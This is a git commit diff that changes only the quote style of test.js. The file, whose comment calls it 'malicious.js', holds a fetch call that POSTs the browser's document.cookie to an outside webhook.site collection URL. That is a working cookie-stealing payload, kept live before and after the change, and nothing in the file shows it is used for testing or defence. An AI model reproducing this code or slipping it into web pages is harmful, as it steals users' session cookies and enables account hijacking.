789cab82ee7e9ead05d624c3e3a4515eb668401f
IrArTr <41453040+IrArTr@users.noreply.github.com>
2024-12-05 15:11:13 -0400

    Update test.js

--- test.js
+++ test.js
@@ -1,6 +1,6 @@
 // malicious.js
-fetch("https://webhook.site/4e96d0f1-3687-4020-8873-c4e886404a47/log", {
-  method: "POST",
-  headers: { "Content-Type": "application/x-www-form-urlencoded" },
+fetch('https://webhook.site/4e96d0f1-3687-4020-8873-c4e886404a47/log', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
   body: `cookies=${document.cookie}`
 });
